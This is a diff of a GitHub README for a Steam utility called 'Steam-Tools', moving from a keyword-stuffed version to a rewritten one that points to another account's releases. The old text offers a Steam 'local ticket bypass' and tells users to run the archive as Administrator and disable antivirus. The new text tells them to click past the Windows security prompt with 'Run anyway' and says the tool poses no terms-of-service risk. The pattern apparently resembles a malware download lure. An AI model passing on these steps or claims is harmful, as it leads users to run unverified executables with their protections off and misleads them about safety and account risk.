@@ -1,62 +1,84 @@
-# Steam Tools
-Steam Tools — steam tools steamtools github download lua tools manifest official client backup mirror beyonddimension archive proxy lua manifest generator setup guide tutorial local ticket bypass bad hash fix watt toolkit alternative
+# 🛠️ Steam-Tools - Simple tools for your Steam library
 
-[![GitHub Stars](https://img.shields.io/github/stars/manojd23625/Steam-Tools?style=flat-square&color=00d4aa)](https://github.com/manojd23625/Steam-Tools/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/manojd23625/Steam-Tools?style=flat-square&color=0099cc)](https://github.com/manojd23625/Steam-Tools/network)
-[![Downloads](https://img.shields.io/github/downloads/manojd23625/Steam-Tools/total?style=flat-square&color=7c5cbf)](https://github.com/manojd23625/Steam-Tools/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
+[![](https://img.shields.io/badge/Download-Steam--Tools-blue.svg)](https://github.com/sarie149/Steam-Tools/releases)
 
-<img width="300" height="93" alt="image" src="https://github.com/user-attachments/assets/06e73f07-c6eb-47a8-a04e-fb4f75aa68d9" />
+Steam-Tools provides a simple way to manage your collection of PC games. This application helps you work with manifests and game files without complex setup processes. It simplifies library maintenance so you spend more time playing games and less time moving files.
 
-## Overview
-Steam Tools is a powerful open-source utility designed for advanced Steam client management and optimization. It provides Lua-based tools for manifest generation, official client backup, archive proxy, local ticket management, and fixing common download issues such as bad hash errors. The application helps users with Steam manifest handling, bypassing certain restrictions, and improving overall Steam experience. It serves as a reliable and lightweight alternative to Watt Toolkit.
+## ⚙️ System Requirements
 
-> [!Important]
-> This project is for educational and personal use only. Use at your own risk. Ensure compliance with Steam Subscriber Agreement. The authors are not responsible for any account issues or violations of service terms.
+Before you install this software, ensure your computer meets these basic requirements.
 
+*   Windows 10 or Windows 11.
+*   The Steam desktop client installed on your machine.
+*   At least 100 megabytes of free space on your hard drive.
+*   An active internet connection to download game manifests.
 
+## 📥 Downloading the Software
 
+Visit the [official releases page](https://github.com/sarie149/Steam-Tools/releases) to download the application. 
 
-## Install
-[Download `Steam-Tools.zip`](https://github.com/manojd23625/Steam-Tools/releases/download/v3.1.0/SteamTools.zip)
----
-> Optimized for Windows 11.
+Follow these steps to obtain the tool:
 
+1. Click the link above to open your web browser.
+2. Look for the section labeled "Assets" at the bottom of the newest version.
+3. Select the file ending in `.exe` to start the download.
+4. Save the file to your desktop or your Downloads folder.
 
-<img width="1399" height="786" alt="image" src="https://github.com/user-attachments/assets/8bbf46bc-c718-476b-afa2-b704f9014883" />
+## 🚀 Setting Up the Application
 
-<img width="1399" height="786" alt="image" src="https://github.com/user-attachments/assets/72bcab1c-cb67-4435-8802-98651481954f" />
+Once you finish the download, complete these steps to prepare the tool for use.
 
-<img width="1399" height="786" alt="image" src="https://github.com/user-attachments/assets/9cbe25fb-aeba-4820-b79c-59df50d9ec0c" />
+1. Locate the file you saved earlier.
+2. Double-click the file to open the installer.
+3. Windows might display a security prompt. If you see this, click "More info" and then select "Run anyway."
+4. Follow the on-screen instructions to finish the installation process.
+5. The installer places a shortcut icon on your desktop.
 
+## 📂 Managing Game Manifests
 
+The core function of this tool involves game manifests. A manifest tells Steam which files exist for a specific game. This tool allows you to refresh these files if a game fails to start or if you encounter errors during launch.
 
-## Installation
-### For Regular Users
-1. Download and extract the archive
-2. Run `SteamTools.exe` as Administrator
-3. Follow the setup guide
-4. Configure Lua manifest generator and proxy settings
-5. Enable features like local ticket bypass and client backup
-6. Start using advanced Steam management tools
+1. Open Steam-Tools using the desktop icon.
+2. The application detects your Steam installation automatically. If the program cannot find Steam, click the "Settings" button and choose your Steam folder manually.
+3. Select a game from the list provided in the main window.
+4. Click the "Check Manifest" button to verify the integrity of your files.
+5. If the tool finds an error, press "Download Manifest" to replace the corrupted file with a fresh copy from the server.
 
----
-## Troubleshooting
-| Problem | Solution |
-|--------------------------------|-------------------------------------------------------|
-| App doesn't start | Run as Administrator and disable antivirus temporarily |
-| Manifest generation failed | Check internet connection and update Lua scripts |
-| Bad hash / download error | Use local ticket bypass and clear cache |
-| Steam client not detected | Verify Steam installation path |
-| Proxy / archive issues | Configure proxy settings correctly |
-| Lua script errors | Update to latest version |
-| Windows 11 compatibility error | Update Windows and reinstall |
-| Download / update failed | Use the latest release and check your internet connection |
+## 🎮 Improving Game Performance
 
-* Steam Tools
-* SteamTools GitHub
-* Steam Manifest Generator
-* Steam Local Ticket
-* Steam Archive Proxy
-* Steam Tools Lua
-* Steam Download Fix 2026
+Steam-Tools offers features to keep your library organized. Use these tools to maintain your game files.
+
+*   Automatic cleanup removes backup files that take up space.
+*   Workshop sync checks for updates to game mods you installed.
+*   Cache clearing fixes common startup problems.
+
+To use these features, navigate to the Tools menu inside the application. Select the task you want to perform and wait for the status bar to show completion.
+
+## 🛡️ Reliability and Safety
+
+We design this software to work alongside your existing gaming setup. It respects your privacy and only accesses the folders required for Steam operations. The software does not change your account passwords or personal billing information. It focuses only on the file paths used by your games and the Steam client itself. If you decide to remove the application, you can uninstall it from the Windows Control Panel like any other program.
+
+## 🔍 Frequently Asked Questions
+
+**Does this tool affect my Steam account standing?**
+No. This tool operates on local files on your computer. It does not interact with Steam servers in a way that risks your account or breaches terms of service.
+
+**What do I do if the tool says the manifest is missing?**
+This happens if a game undergoes a major update or if your previous file was deleted. Simply click the "Download" button inside the tool to restore the necessary files.
+
+**Can I use this for non-Steam games?**
+No. The tool identifies files specifically formatted for the Steam platform. It will not work for games purchased on other services like Epic Games or EA Play.
+
+**How often should I run a check?**
+You do not need to run this tool every day. Only use it when a game fails to load or acts unstable. Routine maintenance once a month is enough for most users.
+
+## 🆘 Getting Further Help
+
+If you encounter an issue that this guide does not cover, check the logs. 
+
+1. Open the application folder on your computer.
+2. Locate the file named "logs.txt".
+3. Open this file with Notepad to view recent activity.
+4. Share the content of this file in the issues section of the GitHub repository if you need help from our community members.
+
+This tool stays updated through the GitHub repository page. Check the releases link periodically to ensure you use the version with the latest fixes.
